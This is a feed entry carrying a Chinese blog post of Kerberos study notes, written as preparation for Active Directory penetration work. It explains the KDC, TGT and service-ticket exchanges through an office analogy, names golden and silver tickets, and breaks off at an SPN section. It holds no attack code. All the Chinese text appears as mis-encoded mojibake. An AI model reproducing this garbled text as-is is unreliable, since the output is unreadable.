  <entry>
    <title>Kerberoså­¦ä¹ è®°å½•</title>
    <link href="http://example.com/2020/06/25/Kerberos%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/2020/06/25/Kerberos%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2020-06-25T02:20:50.000Z</published>
    <updated>2021-09-28T09:31:55.566Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><blockquote><p>æœ€è¿‘åœ¨å­¦ä¹ åŸŸæ¸—é€ï¼Œæ•´ç†äº†ä¸€ä¸‹å¤§ä½¬çš„å†…å®¹ï¼Œå·©å›ºä¸€ä¸‹KerberosåŸºç¡€ã€‚</p></blockquote><h1 id="Kerberos-ç®€ä»‹"><a href="#Kerberos-ç®€ä»‹" class="headerlink" title="Kerberos ç®€ä»‹"></a>Kerberos ç®€ä»‹</h1><blockquote><p> Kerberos æ˜¯ä¸€ç§ç”± MITï¼ˆéº»çœç†å·¥å¤§å­¦ï¼‰æå‡ºçš„ä¸€ç§ç½‘ç»œèº«ä»½éªŒè¯åè®®ã€‚å®ƒæ—¨åœ¨é€šè¿‡ä½¿ç”¨å¯†é’¥åŠ å¯†æŠ€æœ¯ä¸ºå®¢æˆ·ç«¯/æœåŠ¡å™¨åº”ç”¨ç¨‹åºæä¾›å¼ºèº«ä»½éªŒè¯ã€‚</p></blockquote><h2 id="Kerberosåè®®æ¡†æ¶"><a href="#Kerberosåè®®æ¡†æ¶" class="headerlink" title="Kerberosåè®®æ¡†æ¶"></a>Kerberosåè®®æ¡†æ¶</h2><p>Kerberosåè®®ä¸‰ä¸ªä¸»è¦è§’è‰²ï¼š</p><ol><li>è®¿é—®æœåŠ¡çš„Client</li><li>æä¾›æœåŠ¡çš„Sever</li><li>KDCï¼ˆKey Distribution Centerï¼‰ å¯†é’¥åˆ†å‘ä¸­å¿ƒ<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/obnL22.png" alt="obnL22"><br>ç”±ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ° KDC åˆåˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼š</li></ol><blockquote><p> å¦‚æœæŠŠ Kerberos ä¸­çš„ç¥¨æ®ç±»æ¯”ä¸ºä¸€å¼ ç«è½¦ç¥¨ï¼Œé‚£ä¹ˆ Client ç«¯å°±æ˜¯ä¹˜å®¢ï¼ŒServer ç«¯å°±æ˜¯ç«è½¦ï¼Œè€Œ KDC å°±æ˜¯å°±æ˜¯è½¦ç«™çš„è®¤è¯ç³»ç»Ÿã€‚å¦‚æœ Client ç«¯çš„ç¥¨æ®æ˜¯åˆæ³•çš„ï¼ˆç”±ä½ æœ¬äººèº«ä»½è¯è´­ä¹°å¹¶ç”±ä½ æœ¬äººæŒæœ‰ï¼‰åŒæ—¶æœ‰è®¿é—® Server ç«¯æœåŠ¡çš„æƒé™ï¼ˆè½¦ç¥¨å¯¹åº”è½¦æ¬¡æ­£ç¡®ï¼‰é‚£ä¹ˆä½ æ‰èƒ½ä¸Šè½¦ã€‚å½“ç„¶å’Œç«è½¦ç¥¨ä¸ä¸€æ ·çš„æ˜¯ Kerberos ä¸­æœ‰å­˜åœ¨ä¸¤å¼ ç¥¨ï¼Œè€Œç«è½¦ç¥¨ä»å¤´åˆ°å°¾åªæœ‰ä¸€å¼ ã€‚<br> Authentication Serverï¼šAS çš„ä½œç”¨å°±æ˜¯éªŒè¯ Client ç«¯çš„èº«ä»½ï¼ˆç¡®å®šä½ æ˜¯èº«ä»½è¯ä¸Šçš„æœ¬äººï¼‰ï¼ŒéªŒè¯é€šè¿‡å°±ä¼šç»™ä¸€å¼  TGTï¼ˆTicket Granting Ticketï¼‰ç¥¨ç»™ Clientã€‚</p></blockquote><p>Ticket Granting Serverï¼šTGS çš„ä½œç”¨æ˜¯é€šè¿‡ AS å‘é€ç»™ Client çš„ç¥¨ï¼ˆTGTï¼‰æ¢å–è®¿é—® Server ç«¯çš„ç¥¨ï¼ˆä¸Šè½¦çš„ç¥¨ STï¼‰ã€‚STï¼ˆServiceTicketï¼‰ä¹Ÿæœ‰èµ„æ–™ç§°ä¸º TGS Ticketï¼Œä¸ºäº†å’Œ TGS åŒºåˆ†ï¼Œåœ¨è¿™é‡Œå°±ç”¨ ST æ¥è¯´æ˜ã€‚<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/fNwH4b.png" alt="fNwH4b"></p><blockquote><p>KDC æœåŠ¡æ¡†æ¶ä¸­åŒ…å«ä¸€ä¸ª KRBTGT è´¦æˆ·ï¼Œå®ƒæ˜¯åœ¨åˆ›å»ºåŸŸæ—¶ç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºçš„ä¸€ä¸ªè´¦å·ï¼Œä½ å¯ä»¥æš‚æ—¶ç†è§£ä¸ºä»–å°±æ˜¯ä¸€ä¸ªæ— æ³•ç™»é™†çš„è´¦å·ï¼Œåœ¨å‘æ”¾ç¥¨æ®æ—¶ä¼šä½¿ç”¨åˆ°å®ƒçš„å¯†ç  HASH å€¼ã€‚<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/AELrs4.png" alt="AELrs4"></p></blockquote><p>è¿™é‡Œä¹Ÿæœ‰ä¸€ä¸ªå¾ˆå¥½çš„æ•…äº‹</p><blockquote><p>æŸå…¬å¸é­åˆ°ç«äº‰å¯¹æ‰‹çš„æ¸—é€ï¼Œå¤§é‡å…¬å¸å‘˜å·¥è´¦å·è¢«ç›—ï¼Œå…¬å¸é¢†å¯¼ç‘Ÿç‘Ÿå‘æŠ–ï¼Œå› ä¸ºç°åœ¨ä¸çŸ¥é“èŠå¤©çª—å¯¹é¢æ˜¯è‡ªå·±çš„å‘˜å·¥è¿˜æ˜¯ç«äº‰å¯¹æ‰‹ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æ€ä¹ˆæ¥ä¿è¯å‘˜å·¥å’Œè€æ¿é—´çš„å¯¹è¯æ˜¯å®‰å…¨å¹¶ä¸”äº’ç›¸å¯ä¿¡çš„å‘¢ï¼Ÿ</p></blockquote><pre><code>è¿™æ—¶å€™å°±å¼•å…¥äº†ä¸€ä¸ªç¬¬ä¸‰è€…ï¼ŒHRï¼Œç”±äºå…¬å¸æ–½è¡Œå·¥èµ„ä¿å¯†åˆ¶åº¦ï¼Œå‘˜å·¥ä¹‹é—´ä¸çŸ¥é“å½¼æ­¤å·¥èµ„çš„å…·ä½“æ•°å­—ï¼Œä½†æ˜¯HRçŸ¥é“å…¨å…¬å¸å‘˜å·¥çš„å·¥èµ„æ•°å­—ï¼Œç°åœ¨å‡å®šæ¯ä¸ªå‘˜å·¥çš„å·¥èµ„éƒ½æ˜¯ä¸åŒçš„ï¼Œæˆ‘ä»¬ç”¨å‘˜å·¥ï¼Œè€æ¿ï¼Œå’ŒHRæ¥å®Œæˆä¸€ä¸ªå®‰å…¨å¯ä¿¡çš„åŠ å¯†æœºåˆ¶ï¼Œ(å‡å®šHRæ˜¯å¯ä¿¡ä»»çš„)å‘˜å·¥ï¼Œè€æ¿å’ŒHRä¾¿æ˜¯Kerberosè®¤è¯ä¸­çš„ä¸‰ä¸ªè§’è‰²ã€‚é‚£ä¹ˆç»§ç»­è¯´ï¼Œå…¬å¸ç›®å‰å¤„åœ¨è¿™æ ·ä¸€ä¸ªäººä¸äººä¹‹é—´æ¯«æ— ä¿¡ä»»å¯è¨€çš„æƒ…å†µä¸‹ï¼Œè¿˜æ˜¯è¦ç»§ç»­è¿è½¬æŸå¤©ï¼Œå‘˜å·¥å¼ äºŒç‹—éœ€è¦ä»è€æ¿å¤§é»„é‚£é‡Œå–å¾—ä¸€ä»½å…¬å¸æœºå¯†ä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœäºŒç‹—ç›´æ¥ç»™è€æ¿å‘æ¶ˆæ¯ç´¢è¦ä¿¡æ¯ï¼Œé‚£è€æ¿è‚¯å®šä¸ä¼šç»™ä»–ï¼Œå› ä¸ºå…¬å¸èŠå¤©å·¥å…·é‡Œçš„äººç°åœ¨éƒ½æ˜¯ä¸å¯ä¿¡ä»»çš„ï¼ŒäºŒç‹—ä¸çŸ¥é“ç½‘çº¿é‚£è¾¹æ˜¯ä¸æ˜¯çœŸçš„è€æ¿ï¼Œè€æ¿ä¹Ÿä¸çŸ¥é“ç»™è‡ªå·±å‘æ¶ˆæ¯çš„æ˜¯ä¸æ˜¯çœŸçš„äºŒç‹—ï¼Œè¿™æ—¶å€™å°±å°´å°¬äº†ç„¶åè¿™æ—¶ï¼Œèªæ˜çš„è€ç‹å‡ºç°äº†ï¼Œè€ç‹æ˜¯ä¸ªå›½å¤–è¯»äº†10å¹´æœ¬ç§‘çš„å¯†ç å­¦ç –å®¶ï¼Œä»–å°±ç»™å…¬å¸æå‡ºæ¥ä¸€å¥—æµç¨‹ï¼Œé‰´äºç›®å‰å¤§å®¶éƒ½æ²¡æœ‰åŠæ³•ç¡®å®šæŸä¸ªäººå°±æ˜¯æŸä¸ªäººï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ç”¨å¯†ç å­¦çš„æ‰‹æ®µç¡®å®šå½¼æ­¤çš„èº«ä»½å§è¿™ä¸ªæµç¨‹æ˜¯ä»€ä¹ˆå‘¢ï¼Œå¦‚æœäºŒç‹—æƒ³ç»™è€æ¿å‘æ¶ˆæ¯ï¼Œå°±è¦å…ˆé€šè¿‡HRæ¥ç¡®å®šäºŒç‹—å°±æ˜¯äºŒç‹—ï¼Œæ€ä¹ˆç¡®å®šå‘¢ï¼ŒäºŒç‹—çŸ¥é“è‡ªå·±çš„å·¥èµ„ï¼ŒHRä¹ŸçŸ¥é“äºŒç‹—çš„å·¥èµ„ï¼Œé‚£ä¹ˆäºŒç‹—å°±å…ˆç»™HRå‘ä¸ªæ¶ˆæ¯ï¼Œæˆ‘è¦æ‰¾è€æ¿è°ˆè¯ï¼Œå¸®æˆ‘å¼„ä¸ªèº«ä»½é‰´å®šè¯ä¹¦å§ï¼Œä½†æ˜¯äºŒç‹—ä¸èƒ½ç›´æ¥æ‰¾HRè¦è¿™ä¸ªé‰´å®šè¯ä¹¦ï¼Œå› ä¸ºäºŒç‹—è¦å…ˆè¯æ˜äºŒç‹—å°±æ˜¯äºŒç‹—æœ¬äººäºæ˜¯äºŒç‹—å…ˆç»™HRå‘äº†ä¸ªæ¶ˆæ¯ï¼Œæˆ‘æ˜¯äºŒç‹—ï¼Œæˆ‘è¦è¯æ˜æˆ‘å°±æ˜¯äºŒç‹—ï¼HRæ”¶åˆ°äº†äºŒç‹—çš„æ¶ˆæ¯ï¼Œç„¶åä»å…¬å¸æ•°æ®åº“ä¸­ä¸€æŸ¥ï¼Œæœç„¶æœ‰äºŒç‹—è¿™ä¸ªäººï¼Œä½†æ˜¯å³ä½¿æœ‰è¿™ä¸ªäººï¼Œåˆæ€ä¹ˆç¡®å®šäºŒç‹—å°±æ˜¯äºŒç‹—æœ¬äººå‘¢ï¼ŒHRå°±ç”¨äºŒç‹—çš„å·¥èµ„ä½œä¸ºåŠ å¯†å¯†é’¥ï¼Œå¯¹ä¸€ä¸²éå¸¸å¤æ‚çš„æ•°å­—(12345)è¿›è¡ŒåŠ å¯†ä½œä¸ºæ¶ˆæ¯Aï¼Œç„¶ååˆæŠŠè¿™ä¸ªæ•°å­—12345å’Œå½“å‰è·ŸäºŒç‹—èŠå¤©çª—å£çš„æˆªå›¾è¿˜æœ‰èŠå¤©çš„æ—¶é—´è®°åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå†ç”¨è‡ªå·±çš„å·¥èµ„å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡ŒåŠ å¯†ä½œä¸ºæ¶ˆæ¯Bä¹‹åHRæŠŠç”¨äºŒç‹—å·¥èµ„åŠ å¯†çš„æ¶ˆæ¯Aå’Œç”¨è‡ªå·±å·¥èµ„åŠ å¯†çš„æ¶ˆæ¯Bä¸€èµ·å‘é€ç»™äºŒç‹—ï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·åšå‘¢ï¼ŒäºŒç‹—å¦‚æœèƒ½æˆåŠŸè§£å¯†æ¶ˆæ¯Aï¼Œå°±èƒ½å¾—åˆ°12345ï¼Œå› ä¸ºåªæœ‰çœŸæ­£çš„äºŒç‹—çŸ¥é“è‡ªå·±çš„å·¥èµ„ï¼Œå‡äºŒç‹—ä¸çŸ¥é“ï¼Œæ¶ˆæ¯Båˆæ˜¯ç”¨æ¥åšä»€ä¹ˆçš„å‘¢ï¼Œæˆ‘ä»¬ç»§ç»­çœ‹</code></pre><p>äºŒç‹—å‘é€å®Œæ¶ˆæ¯ä¹‹åï¼Œç›¯ç€èŠå¤©çª—ï¼Œç„¶åé’‰ï¼Œé’‰ï¼Œå“äº†ä¸¤å£°ï¼ŒHRå‘æ¥äº†ä¸¤ä¸²ä¸œè¥¿ï¼ŒäºŒç‹—çœ‹ä¸æ‡‚ï¼Œä½†æ˜¯äºŒç‹—æƒ³èµ·æ¥ä¹‹å‰è€ç‹æå‡ºæ¥çš„è®¤è¯æµç¨‹ï¼Œå…ˆç”¨è‡ªå·±çš„å·¥èµ„è§£å¯†äº†ç¬¬ä¸€ä¸ªæ¶ˆæ¯ï¼Œå¾—åˆ°äº†é‚£ä¸²æ•°å­—12345ï¼Œç„¶åç”¨è¿™ä¸²12345æŠŠè·ŸHRèŠå¤©çª—å£çš„æˆªå›¾å’Œæ—¶é—´æ”¾åœ¨ä¸€èµ·è¿›è¡Œäº†åŠ å¯†ï¼Œä½œä¸ºæ¶ˆæ¯Dï¼Œé‚£ä¹ˆæ¶ˆæ¯Cæ˜¯ä»€ä¹ˆå‘¢ï¼Œæ¶ˆæ¯Cå°±æ˜¯HRå‘æ¥çš„ç¬¬äºŒä¸ªæ¶ˆæ¯ï¼Œæ¶ˆæ¯Bï¼Œä¸è¿‡è¿™æ¬¡æ¶ˆæ¯Cä¸­è¿˜è¦å¤šä¸€ä¸ªä¸œè¥¿ï¼Œå°±æ˜¯è€æ¿çš„åå­—å¤§é»„ï¼Œå¤§é»„å’Œæ¶ˆæ¯Båˆåœ¨ä¸€èµ·å°±ç»„æˆäº†æ¶ˆæ¯C</p><pre><code>ä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºäºŒç‹—è¿™æ¬¡å‘é€çš„æ¶ˆæ¯Cå’ŒDå°±æ˜¯ä¸ºäº†è¯æ˜ä»–å°±æ˜¯äºŒç‹—æœ¬äººï¼ŒäºŒç‹—è‡ªç„¶ç¡®å®šè‡ªå·±å°±æ˜¯çœŸäºŒç‹—ï¼Œé‚£ä¹ˆè‡ªç„¶ä¹Ÿè¦æŠŠè€æ¿çš„åå­—åŠ åˆ°æ¶ˆæ¯ä¸­ï¼Œå› ä¸ºä»–è¦HRç»™ä»–ç”¨æ¥è·Ÿè€æ¿å¯¹è¯çš„èº«ä»½é‰´å®šè¯ä¹¦ï¼Œå¦‚æœä¸åŠ ä¸Šè€æ¿çš„åå­—ï¼ŒHRå³ä¾¿ç¡®å®šäº†äºŒç‹—æ˜¯äºŒç‹—ï¼Œä¹Ÿä¸çŸ¥é“äºŒç‹—è¦è·Ÿè°å¯¹è¯ç°åœ¨æ¶ˆæ¯C(æ¶ˆæ¯Bå’Œè€æ¿çš„åå­—å¤§é»„)å’Œæ¶ˆæ¯D(äºŒç‹—ç”¨12345åŠ å¯†çš„èŠå¤©çª—å£æˆªå›¾å’ŒèŠå¤©æ—¶é—´)å°±å‘åˆ°äº†HRé‚£é‡Œ</code></pre><p>HRæ”¶åˆ°äº†æ¶ˆæ¯Cå’ŒDï¼Œå¾—åˆ°äº†ä¸‰ä¸ªä¸œè¥¿ï¼ŒåŸæ¥ç”¨è‡ªå·±å·¥èµ„åŠ å¯†çš„æ¶ˆæ¯Bï¼Œè€æ¿çš„åå­—ï¼Œå’Œä¹‹å‰è‡ªå·±éšä¾¿æƒ³å‡ºæ¥çš„12345åŠ å¯†çš„æ¶ˆæ¯D</p><pre><code>è¿™é‡Œå°±æ¥åˆ°äº†ç¬¬ä¸€ä¸ªå…³é”®ç‚¹ï¼ŒHRæ€ä¹ˆé€šè¿‡è¿™å‡ ä¸ªä¸œè¥¿æ¥ç¡®å®šäºŒç‹—å°±æ˜¯äºŒç‹—å‘¢ï¼ŒHRé¦–å…ˆç”¨è‡ªå·±çš„å·¥èµ„è§£å¯†äº†æ¶ˆæ¯Cï¼Œå¾—åˆ°äº†ä¹‹å‰çš„èŠå¤©çª—æˆªå›¾å’ŒèŠå¤©æ—¶é—´ï¼Œè¿˜æœ‰è‡ªå·±ä¹‹å‰éšä¾¿æƒ³å‡ºæ¥çš„12345ï¼Œç„¶åç”¨è¿™ä¸ª12345æ¥è§£å¯†æ¶ˆæ¯Dï¼Œåˆå¾—åˆ°äº†äºŒç‹—å¯¹ä»–ä»¬ä¸¤ä¸ªçš„èŠå¤©çª—çš„æˆªå›¾å’ŒèŠå¤©æ—¶é—´ï¼Œé€šè¿‡å¯¹æ¯”è¿™ä¸¤ä¸ªèŠå¤©çª—æˆªå›¾å’Œæ—¶é—´æ˜¯å¦éƒ½åŒ¹é…ï¼ŒHRå°±ç¡®å®šäº†è¿™ä¸ªäºŒç‹—æ˜¯çœŸçš„äºŒç‹—(å‡äºŒç‹—ä¸çŸ¥é“çœŸäºŒç‹—çš„å·¥èµ„ï¼Œæ‰€ä»¥å°±æ— æ³•è§£å¯†å¾—åˆ°12345ï¼Œä¹Ÿå°±æ²¡æ³•ç”¨12345åŠ å¯†æ¶ˆæ¯Dï¼ŒHRè‡ªç„¶ä¹Ÿæ²¡åŠæ³•è§£å¯†äº†)ï¼Œå¹¶ä¸”å°±æ˜¯ä¹‹å‰è·Ÿè‡ªå·±èŠå¤©çš„é‚£ä¸ªäºŒç‹—(å› ä¸ºä¹‹å‰å‘è¿‡å»çš„ç”¨è‡ªå·±å·¥èµ„åŠ å¯†çš„æ¶ˆæ¯BåŸå°ä¸åŠ¨çš„å‘å›æ¥äº†ï¼Œè€Œè¿™ä¸ªæ¶ˆæ¯Bé™¤äº†è‡ªå·±è°éƒ½æ— æ³•è§£å¯†ä¿®æ”¹)è¿™é‡Œæœ‰äººè¦é—®äº†ï¼Œé‚£HRç›´æ¥ç”¨è‡ªå·±æƒ³å‡ºæ¥çš„12345è§£å¯†æ¶ˆæ¯Dä¸æ˜¯ä¹Ÿå¯ä»¥ç¡®å®šäºŒç‹—å°±æ˜¯çœŸäºŒç‹—å—ï¼Œè¿™ä¸ªæ€ä¹ˆè§£é‡Šå‘¢ï¼Œè¿™ä¸ªå…¬å¸æœ‰ä¸€ç™¾ä¸‡ä¸ªå‘˜å·¥ï¼Œæ¯ä¸ªå‘˜å·¥æ—¶ä¸æ—¶éƒ½æƒ³è·Ÿè€æ¿è¯´è¯´è¯ï¼Œè€ŒHRè„‘å­å­˜å‚¨é‡ä¸å¤Ÿå¤§ï¼Œè®°ä¸ä½12345è¿™ä¹ˆå¤æ‚çš„æ•°å­—ï¼Œæ›´ä½•å†µæ˜¯ä¸€ç™¾ä¸‡ä¸ª12345ï¼Œé‚£è„‘å­ä¸å¾—çˆ†ç‚¸äº†ï¼Œæ‰€ä»¥æŠŠ12345ç”¨è‡ªå·±çš„å¯†é’¥åŠ å¯†å‘è¿‡å»ï¼Œå†æ”¶å›æ¥ç”¨è‡ªå·±çš„å¯†é’¥è§£å¯†å–å‡ºæ¥ï¼Œè¿™æ ·å°±ä¸ç”¨è®°äº†ç°åœ¨HRç¡®å®šäº†äºŒç‹—å°±æ˜¯äºŒç‹—ï¼Œé‚£ä¹ˆçœ‹çœ‹äºŒç‹—æƒ³è·Ÿè°èŠå¤©å§ï¼Œæ¶ˆæ¯Cä¸­å†™çš„æ˜¯è€æ¿å¤§é»„çš„åå­—ï¼ŒHRå°±ä»å…¬å¸æ•°æ®åº“ä¸­æŸ¥ï¼Œè€æ¿å¤§é»„ï¼šå·¥èµ„4å—3æ¯›1è§’ç„¶åHRåˆç”¨è€æ¿çš„å·¥èµ„ï¼ŒåŠ å¯†äº†å’ŒäºŒç‹—èŠå¤©çª—å£çš„æˆªå›¾ï¼ŒèŠå¤©æ—¶é—´å’Œå¦ä¸€ä¸²éå¸¸å¤æ‚çš„æ•°å­—45678 ä½œä¸ºæ¶ˆæ¯E(ä¹Ÿå°±æ˜¯é‰´å®šè¯ä¹¦)ï¼Œå’Œç”¨ä»æ¶ˆæ¯Cä¸­æ‰¾åˆ°12345åŠ å¯†äº†æ–°çš„å¤æ‚æ•°å­—45678ä½œä¸ºæ¶ˆæ¯Fåˆå›åˆ°äºŒç‹—è¿™é‡Œï¼ŒäºŒç‹—æ”¶åˆ°è¿™ä¸¤ä¸ªæ¶ˆæ¯ï¼Œç”¨12345è§£å¯†äº†ç¬¬äºŒä¸ªæ¶ˆæ¯Fï¼Œå¾—åˆ°äº†45678ï¼Œç„¶åç”¨45678åŠ å¯†äº†è‡ªå·±å’ŒHRçš„èŠå¤©çª—æˆªå›¾å’ŒèŠå¤©æ—¶é—´ä½œä¸ºæ¶ˆæ¯Gï¼Œä¹‹åæŠŠæ¶ˆæ¯Eå’Œæ¶ˆæ¯Gå‘ç»™è€æ¿ï¼Œæ˜¯ä¸æ˜¯å’Œä¹‹å‰å¾ˆåƒè¿™æ—¶è€æ¿æ”¶åˆ°äº†äºŒç‹—çš„æ¶ˆæ¯ï¼Œè€æ¿å…ˆç”¨è‡ªå·±çš„å·¥èµ„è§£å¯†äº†æ¶ˆæ¯E(HRç”¨è€æ¿å·¥èµ„åŠ å¯†çš„æˆªå›¾ï¼ŒèŠå¤©æ—¶é—´è¿˜æœ‰45678)ï¼Œå¾—åˆ°äº†45678ï¼Œç„¶åç”¨è¿™ä¸²å¤æ‚çš„æ•°å­—æˆåŠŸè§£å¯†äº†æ¶ˆæ¯Gï¼Œå¾—åˆ°äºŒç‹—çš„æˆªå›¾å’ŒèŠå¤©æ—¶é—´ï¼Œå†å¯¹æ¯”è¿™ä¸¤ä¸ªèŠå¤©æˆªå›¾å’ŒèŠå¤©æ—¶é—´æ˜¯ä¸æ˜¯ä¸€æ ·çš„ï¼Œä¸€æ ·çš„è¯è€æ¿æ‰èƒ½ç¡®å®šäºŒç‹—æ˜¯çœŸäºŒç‹—ï¼Œç»è¿‡HRæƒå¨è®¤å®šçš„äºŒç‹—ï¼Œå¯ä»¥å……æ»¡ä¿¡ä»»çš„èŠå¤©äº†ï¼Œè¿™é‡Œå…¶å®ä¹Ÿæœ‰å¯¹è€æ¿èº«ä»½çš„é‰´åˆ«ï¼Œå› ä¸ºå‡è€æ¿ä¸ä¼šçŸ¥é“çœŸè€æ¿çš„å·¥èµ„ï¼Œè‡ªç„¶ä¹Ÿå°±æ²¡æœ‰åŠæ³•è§£å¯†æ¶ˆæ¯Eè‡³æ­¤æ•´ä¸ªè®¤è¯æµç¨‹åŸºæœ¬ç»“æŸï¼Œæˆ‘ä»¬å°†å…¶ä¸­çš„å‡ ä¸ªå…³é”®ä¿¡æ¯æå–å‡ºæ¥ï¼Œæ¢æˆæ­£å¸¸å«ä¹‰ä¸‹å¯¹åº”çš„è¯è¯­</code></pre><ul><li>äºŒç‹— Client</li><li>HR KDC</li><li>è€æ¿å¤§é»„ Service/Server</li><li>äºŒç‹—çš„å·¥èµ„ Client NTLM Hash</li><li>HRçš„å·¥èµ„ krbtgt NTLM Hash</li><li>è€æ¿çš„å·¥èµ„ Service/Server NTLM Hash</li><li>HRå·¥èµ„åŠ å¯†çš„æˆªå›¾ï¼Œæ—¶é—´å’Œ12345 TGT é»„é‡‘ç¥¨æ®</li><li>è€æ¿å·¥èµ„åŠ å¯†çš„æˆªå›¾ï¼Œæ—¶é—´å’Œ45678 TGS ç™½é“¶ç¥¨æ®</li><li>12345 Client/TGS Sessionkey</li><li>45678 Client/Service Sessionkey</li><li>èŠå¤©çª—æˆªå›¾ Client ID</li><li>èŠå¤©æ—¶é—´ Timestamp æ—¶é—´æˆ³</li></ul><blockquote><p> åŸæ–‡æ¥è‡ªï¼š<a href="https://ares-x.com/2020/03/12/%E6%88%8F%E8%AF%B4%E5%9C%B0%E7%8B%B1%E4%B8%89%E5%A4%B4%E7%8A%AC/">https://ares-x.com/2020/03/12/æˆè¯´åœ°ç‹±ä¸‰å¤´çŠ¬/</a> 3</p></blockquote><h2 id="Kerberosè®¤è¯æµç¨‹"><a href="#Kerberosè®¤è¯æµç¨‹" class="headerlink" title="Kerberosè®¤è¯æµç¨‹"></a>Kerberosè®¤è¯æµç¨‹</h2><p>å½“ Client æƒ³è¦è®¿é—® Server ä¸Šçš„æŸä¸ªæœåŠ¡æ—¶ï¼Œéœ€è¦å…ˆå‘ AS è¯æ˜è‡ªå·±çš„èº«ä»½ï¼Œç„¶åé€šè¿‡ AS å‘æ”¾çš„ TGT å‘ Server å‘èµ·è®¤è¯è¯·æ±‚ï¼Œè¿™ä¸ªè¿‡ç¨‹åˆ†ä¸ºä¸‰å—ï¼š</p><ol><li>The Authentication Service Exchangeï¼šClient ä¸ AS çš„äº¤äº’ï¼›</li><li>The Ticket-Granting Service (TGS) Exchangeï¼šClient ä¸ TGS çš„äº¤äº’ï¼›</li><li>The Client/Server Authentication Exchangeï¼šClient ä¸ Server çš„äº¤äº’ã€‚</li></ol><p><strong>The Authentication Service Exchange</strong></p><p>Client-&gt;AS:ä¹Ÿå°±æ˜¯Clientå‘ASå‘é€è®¤è¯çš„å†…å®¹<br>Clientå…ˆå‘KDCçš„è®¤è¯æœåŠ¡å™¨ASå‘é€Authentor1ï¼Œå…¶ä¸­å†…å®¹é€šè¿‡Clientå¯†ç çš„HashåŠ å¯†çš„æ—¶é—´æˆ³ã€ClientIDã€ç½‘ç»œåœ°å€ã€åŠ å¯†ç±»å‹ç­‰å…¶ä»–å†…å®¹</p><p>AS-&gt;Client ï¼šASå›å¤Clientçš„è®¤è¯å†…å®¹<br>ASå‘é€ Client å¯†ç åŠ å¯†çš„ sessionkey-as å’Œç¥¨æ® TGT(KRBTGT HASH åŠ å¯†çš„ sessionkey-as å’Œ TimeStamp)<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/D2c3gE.png" alt="D2c3gE"></p><blockquote><p> åœ¨ KDC ä¸­å­˜å‚¨äº†åŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„å¯†ç  HASHï¼Œå½“ AS æ¥æ”¶åˆ° Client çš„è¯·æ±‚ä¹‹åä¼šæ ¹æ® KDC ä¸­å­˜å‚¨çš„å¯†ç æ¥è§£å¯†ï¼Œè§£å¯†æˆåŠŸå¹¶ä¸”éªŒè¯ä¿¡æ¯ã€‚éªŒè¯æˆåŠŸåè¿”å›ç»™ Client ç”± Client å¯†ç  HASH åŠ å¯†çš„ sessionkey-as å’Œ TGTï¼ˆç”± KRBTGT HASH åŠ å¯†çš„ sessionkey-as å’Œ TimeStamp ç­‰ä¿¡æ¯ï¼‰ã€‚</p></blockquote><p><strong>TheTicket-Granting Service (TGS) Exchange</strong><br>    Client -&gt;TGS è¯·æ±‚å‘é€ Authenticator2 (sessionkey-as åŠ å¯† TimeStamp) å’Œç¥¨æ® TGT(KRBTGT HASH åŠ å¯†çš„ sessionkey-as å’Œ TimeStamp)</p><pre><code>Client æ¥æ”¶åˆ°äº†åŠ å¯†åçš„ Sessionkey-as å’Œ TGT ä¹‹åï¼Œç”¨è‡ªèº«å¯†ç è§£å¯†å¾—åˆ° Sessionkey-asï¼ŒTGT æ˜¯ç”± KDC å¯†ç åŠ å¯†ï¼ŒClient æ— æ³•è§£å¯†ã€‚è¿™æ—¶ Client å†ç”¨ Sessionkey-as åŠ å¯† TimeStamp å’Œ TGT ä¸€èµ·å‘é€ç»™ KDC ä¸­çš„ TGSï¼ˆTicketGranting Serverï¼‰ç¥¨æ®æˆæƒæœåŠ¡å™¨æ¢å–èƒ½å¤Ÿè®¿é—® Server çš„ç¥¨æ®ã€‚</code></pre><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/wZvqjl.png" alt="wZvqjl"></p><p><strong>TheClient/Server Authentication Exchange</strong></p><p>KRB_AP_REQ<br>Client -&gt;Server å‘é€ Authenticator3(sessionkey-tgs åŠ å¯† TimeStamp) å’Œç¥¨æ® ST(Server å¯†ç  HASH åŠ å¯† sessionkey-tgs)<br>Client æ”¶åˆ° sessionkey-as åŠ å¯†çš„ sessionkey-tgs å’Œ Server å¯†ç  HASH åŠ å¯†çš„ sessionkey-tgs ä¹‹åç”¨ sessionkey-as è§£å¯†å¾—åˆ° sessionkey-tgsï¼Œç„¶åæŠŠ sessionkey-tgs åŠ å¯†çš„ TimeStamp å’Œ ST ä¸€èµ·å‘é€ç»™ Serverã€‚</p><p>KRB_AP_REP<br>Server-&gt; Client<br>server é€šè¿‡è‡ªå·±çš„å¯†ç è§£å¯† STï¼Œå¾—åˆ° sessionkey-tgs, å†ç”¨ sessionkey-tgs è§£å¯† Authenticator3 å¾—åˆ° TimeStampï¼ŒéªŒè¯æ­£ç¡®è¿”å›éªŒè¯æˆåŠŸã€‚<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/9Z88KB.png" alt="9Z88KB"></p><h1 id="Kerberosåè®®ä¸­çš„SPN"><a href="#Kerberosåè®®ä¸­çš„SPN" class="headerlink" title="Kerberosåè®®ä¸­çš„SPN"></a>Kerberosåè®®ä¸­çš„SPN</h1><h2 id="å…³äºSPN"><a href="#å…³äºSPN" class="headerlink" 